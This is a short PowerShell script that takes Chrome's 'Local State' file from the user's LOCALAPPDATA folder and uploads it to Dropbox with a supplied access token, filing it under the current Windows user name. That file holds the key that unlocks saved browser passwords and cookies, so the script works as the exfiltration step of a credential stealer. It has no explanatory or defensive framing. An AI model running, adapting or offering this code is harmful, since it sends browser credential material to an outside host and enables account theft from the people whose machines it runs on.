
param(
    [Parameter(Mandatory = $true)]
    [string]$AccessToken
)

# Specify the path to the Local State file
$paths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
)
function Get-CurrentUser {
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    return $currentUser.Name
}

$currentUser = Get-CurrentUser
$currentUser = $currentUser -replace "\\", "-"


function Upload-ToDropbox {
    Param(
        [Parameter(Mandatory = $true)]
        [string]$FilePath,
        [Parameter(Mandatory = $true)]
        [string]$DestinationPath
    )

    $dropboxApiArg = @{
        "autorename" = $true
        "mode" = "add"
        "mute" = $false
        "path" = "/$(${DestinationPath} -replace "\\", "/")"
        "strict_conflict" = $false
    }
    $dropboxApiArgJson = $dropboxApiArg | ConvertTo-Json -Compress
    $dropboxApiArgJson = $dropboxApiArgJson -replace "`r`n", ""
    $FilePath = $FilePath -replace "\\", "/"
    # Send the file content over HTTPS
    $headers = @{
        "Authorization" = "Bearer $AccessToken"
        "Dropbox-API-Arg" = $dropboxApiArgJson
    }
    Invoke-WebRequest -Uri "https://content.dropboxapi.com/2/files/upload" `
        -Method Post `
        -Headers $headers `
        -ContentType "application/octet-stream" `
        -InFile $FilePath
}

foreach ($path in $paths) {
    # Get the file name
    try {
        Write-Output "1"
        $parentDirectory = Split-Path -Path $path -Parent
        Write-Output "1"
        
        $grandParentDirectory = Split-Path -Path $parentDirectory -Parent
        Write-Output "1"
        
        $greatGrandParentDirectory = Split-Path -Path $grandParentDirectory -Parent
        Write-Output "1"
        
        $relativePath = $path.Replace($greatGrandParentDirectory + "\", "")

        Write-Output "1"
        $OutPath = Join-Path -Path $currentUser -ChildPath $RelativePath
        Write-Output "1"

        Upload-ToDropbox -FilePath $path -DestinationPath $OutPath
        Write-Output "1"

    } catch {
        Write-Output "Failed to upload $path"
    }
    

}

